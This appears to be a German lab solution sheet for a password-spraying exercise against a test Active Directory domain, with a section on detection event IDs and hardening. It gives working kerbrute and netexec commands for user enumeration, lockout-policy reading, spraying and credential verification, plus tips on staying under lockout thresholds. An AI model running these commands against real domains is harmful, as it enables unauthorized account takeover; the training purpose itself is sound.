# Lösung – Übung 04: Password Spraying & kerbrute

`<DC>` = DC-IP, Domäne `lab.local`.

## 1. User-Enum (kerbrute)

```bash
kerbrute userenum -d lab.local --dc <DC> users.txt
```
```
[+] VALID USERNAME: mmuster@lab.local
[+] VALID USERNAME: svc_sql@lab.local
```
Nutzt Kerberos-AS-REQ → **keine** 4625-Fehllogins, kein Lockout.

## 2. Lockout-Fenster

```bash
netexec smb <DC> -u mmuster -p 'Passwort' --pass-pol
# z.B. Lockout Threshold: 5, Observation Window: 30 min
```
→ max. **4 Versuche** pro User je 30-Minuten-Fenster.

## 3. Spraying

```bash
kerbrute passwordspray -d lab.local --dc <DC> valid_users.txt 'Frühling2024!'
# oder netexec (ein PW gegen viele User):
netexec smb <DC> -u valid_users.txt -p 'Frühling2024!' --continue-on-success
```
Treffer: `[+] lab.local\jdoe:Frühling2024! (Pwn3d!?)`.

## 4. Verifizieren

```bash
netexec smb <DC> -u jdoe -p 'Frühling2024!'
netexec ldap <DC> -u jdoe -p 'Frühling2024!'
```

## 5. Detection + Härtung

- **Event-IDs:** 4625 (failed logon), 4768/4771 (Kerberos preauth failed), gehäuft über viele Accounts = Spraying-Signatur → SIEM-Alert.
- **Härtung:** **MFA** (entwertet Spraying), starke/lange Passphrasen + Leak-Sperrlisten, sinnvolle Lockout-Policy, Smart Lockout/Monitoring, Rate-Limiting am Perimeter.

## Häufige Fehler / Troubleshooting

- **Clock-Skew:** Kerberos braucht Zeitsync (Kali ↔ DC) → `sudo ntpdate <DC>`.
- **Lockout ausgelöst:** zu viele Versuche/Fenster → langsamer, kerbrute statt SMB.
- **kerbrute fehlt:** Release-Binary (GitHub) nutzen.
- **Alle „invalid":** Domänenname/DC falsch; Userliste in `user@domain`- oder SamAccount-Form.
